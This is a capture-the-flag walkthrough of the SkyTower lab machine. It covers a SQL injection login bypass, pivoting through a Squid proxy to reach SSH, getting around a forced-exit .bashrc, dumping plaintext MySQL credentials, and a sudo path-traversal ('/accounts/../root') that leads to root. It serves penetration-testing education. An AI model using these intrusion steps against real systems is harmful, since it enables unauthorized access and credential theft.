I"¡4<p>This is a GNU/Linux machine vulnerable to SQL Injection, which allows us to bypass the login form and access a restricted area that contains credentials, the same that allow access to the server through SSH, in addition to credentials stored in the database in plain text that allowed access as different users of the system, and to get root it took advantage of sudo permissions.</p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>A ping sweep on the local network discovered the target machine, the script you can download it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/skytower<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
192.168.179.175 is alive
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>A full TCP port scan with nmap discovered two open ports and one that is filtered.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/skytower<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p-</span> <span class="nt">-T4</span> 192.168.179.175 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT     STATE    SERVICE
22/tcp   filtered ssh
80/tcp   open     http
3128/tcp open     squid-http
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>An aggressive scan with nmap discovered more information about the open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/skytower<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-p80</span>,3128 192.168.179.175 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.2.22 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.22 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
3128/tcp open  http-proxy Squid http proxy 3.1.20
|_http-server-header: squid/3.1.20
|_http-title: ERROR: The requested URL could not be retrieved
...
</span></code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>The web application contains a login form, by adding a single quote in the user field it was possible to detect that MySQL is running.</p>

<p><img src="/assets/images/skytower1/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/skytower1/screenshot-2.png" alt="" /></p>

<p>After of try various manual tests for a possible login bypass, I found the following SQL statement that worked.</p>

<p><img src="/assets/images/skytower1/screenshot-3.png" alt="" /></p>

<p>We can see the credentials to access via SSH.</p>

<p><img src="/assets/images/skytower1/screenshot-4.png" alt="" /></p>

<h3 id="squid-enumeration">Squid Enumeration</h3>

<p>Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more. It reduces bandwidth and improves response times by caching and reusing frequently-requested web pages.</p>

<p>We can also use it to enumerate services that are running locally on the server or that we canâ€™t access.</p>

<p><img src="/assets/images/skytower1/screenshot-5.png" alt="" /></p>

<p>If we remember the SSH service on port 22 is filtered, to be able to access through the proxy we need to add <strong>http 192.168.179.175 3128</strong> at the end of the file <strong>/etc/proxychains4.conf</strong>.</p>

<p>As we are going to be using proxychains it is necessary to start the TOR service, the following scan with nmap through proxychains reveals that the SSH service is open.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/skytower<span class="nv">$ </span>systemctl start tor

root@kali:~/skytower<span class="nv">$ </span>proxychains nmap <span class="nt">-sT</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-p22</span> 192.168.179.175 
...
PORT   STATE SERVICE
22/tcp open  ssh
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>Now we can login via SSH using the proxy.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/skytower<span class="nv">$ </span>proxychains ssh john@192.168.179.175
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14
<span class="o">[</span>proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
john@192.168.179.175<span class="s1">'s password: 
Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jun 20 07:41:08 2014

Funds have been withdrawn
Connection to 192.168.179.175 closed.
</span></code></pre></div></div>

<p>The connection is established but we donâ€™t get a shell, we can bypass this simply adding <strong>/bin/bash</strong> as follows.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/skytower<span class="nv">$ </span>proxychains ssh john@192.168.179.175 /bin/bash
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14
<span class="o">[</span>proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
john@192.168.179.175<span class="s1">'s password:
id
uid=1000(john) gid=1000(john) groups=1000(john)
</span></code></pre></div></div>

<p>Now we can execute system commands, in the <strong>/var/www</strong> directory there is a file named login.php that contains the credentials to log into MySQL.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">pwd</span>
/var/www
<span class="nb">head</span> <span class="nt">-n</span> 8 login.php
&lt;?php

<span class="nv">$db</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="s1">'localhost'</span>, <span class="s1">'root'</span>, <span class="s1">'root'</span>, <span class="s1">'SkyTech'</span><span class="o">)</span><span class="p">;</span>

<span class="k">if</span><span class="o">(</span><span class="nv">$db</span>-&gt;connect_errno <span class="o">&gt;</span> 0<span class="o">){</span>
    die<span class="o">(</span><span class="s1">'Unable to connect to database ['</span> <span class="nb">.</span> <span class="nv">$db</span>-&gt;connect_error <span class="nb">.</span> <span class="s1">']'</span><span class="o">)</span><span class="p">;</span>

<span class="o">}</span>
</code></pre></div></div>

<p>The following one-line instruction lists the available databases.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> root <span class="nt">-proot</span> <span class="nt">-e</span> <span class="s2">"show databases"</span>
Database
information_schema
SkyTech
mysql
performance_schema
</code></pre></div></div>

<p>Enumerating the SkyTech database tables.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> root <span class="nt">-proot</span> <span class="nt">-e</span> <span class="s2">"use SkyTech; show tables"</span>
Tables_in_SkyTech
login
</code></pre></div></div>

<p>Retrieving the records from the table login.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> root <span class="nt">-proot</span> <span class="nt">-e</span> <span class="s2">"use SkyTech; select * from login"</span>
<span class="nb">id      </span>email   password
1       john@skytech.com        hereisjohn
2       sara@skytech.com        ihatethisjob
3       william@skytech.com     senseable
</code></pre></div></div>

<p>We have the password for the users in plain text, so we login via SSH as user sara.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/skytower<span class="nv">$ </span>proxychains ssh sara@192.168.179.175 /bin/bash           
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf                       
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4          
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14                                     
<span class="o">[</span>proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
sara@192.168.179.175<span class="s1">'s password:                                
id                                                             
uid=1001(sara) gid=1001(sara) groups=1001(sara)
</span></code></pre></div></div>

<p>As we see we donâ€™t have an interactive shell, thatâ€™s annoying, if we check the last three lines of the .bashrc file, thatâ€™s what interrupts that we can access the system and have a shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">tail</span> <span class="nt">-n</span> 3 .bashrc
<span class="nb">echo
echo</span>  <span class="s2">"Funds have been withdrawn"</span>
<span class="nb">exit</span>
</code></pre></div></div>

<p>We can remove the last three lines from the .bashrc file and get a TTY shell, as follows:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv</span> .bashrc bashrc   
<span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'1,111p'</span> bashrc <span class="o">&gt;</span> .bashrc
script <span class="nt">-qc</span> /bin/bash /dev/null
sara@SkyTower:~<span class="nv">$ </span><span class="nb">id  
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sara<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sara<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>sara<span class="o">)</span>
</code></pre></div></div>

<p>The user sara is allowed to execute the cat and ls commands as sudo in the directory /accounts/, we will take advantage of this to get root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sara@SkyTower:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>sara on this host:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User sara may run the following commands on this host:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/cat /accounts/<span class="k">*</span>, <span class="o">(</span>root<span class="o">)</span> /bin/ls /accounts/<span class="k">*</span>
</code></pre></div></div>

<p>Using sudo we can list the /root directory and read the flag that contains the password for the user root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sara@SkyTower:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/ls /accounts/../root
flag.txt
sara@SkyTower:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
</code></pre></div></div>

<p>Finally we login via SSH as user root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/skytower<span class="nv">$ </span>proxychains ssh root@192.168.179.175 <span class="s1">'/bin/bash -i'</span>
<span class="o">[</span>proxychains] config file found: /etc/proxychains4.conf
<span class="o">[</span>proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
<span class="o">[</span>proxychains] DLL init: proxychains-ng 4.14
<span class="o">[</span>proxychains] Dynamic chain  ...  192.168.179.175:3128  ...  192.168.179.175:22  ...  OK
root@192.168.179.175<span class="s1">'s password: 
bash: cannot set terminal process group (-1): Invalid argument
bash: no job control in this shell
root@SkyTower:~# id
id
uid=0(root) gid=0(root) groups=0(root)  
</span></code></pre></div></div>
:ET